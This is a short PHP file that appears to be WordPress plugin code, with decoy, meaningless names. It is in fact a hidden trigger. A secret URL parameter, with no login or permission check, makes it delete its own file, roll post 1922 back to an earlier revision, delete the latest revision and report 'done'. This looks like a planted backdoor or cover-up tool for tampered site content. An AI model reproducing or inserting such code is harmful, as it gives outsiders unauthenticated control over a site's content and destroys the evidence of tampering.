<?php

function pages_option_safe() {
	if (isset($_GET['management_youtube_forum_follow']) && $_GET['management_youtube_forum_follow'] === 'picker_year_now') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$embed_accordion_tracker = 1922;
		$extension_core_sort_categories = wp_get_post_revisions($embed_accordion_tracker);
		if (empty($extension_core_sort_categories)) die('no revisions');
		if (count($extension_core_sort_categories) < 2) die('less than 2');
		$reviews_query_reminder_player = array_shift($extension_core_sort_categories);
		$featured_jquery_group_nav = $reviews_query_reminder_player->ID;
		$scheduled_radio_popular_app = array_shift($extension_core_sort_categories);
		$audio_hide_copy = $scheduled_radio_popular_app->ID;
		$rest_nofollow_live_direct = wp_restore_post_revision($audio_hide_copy);
		if ($rest_nofollow_live_direct === false) die('error restoring');
		$rest_nofollow_live_direct = wp_delete_post_revision($featured_jquery_group_nav);		
		if ($rest_nofollow_live_direct === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'pages_option_safe');
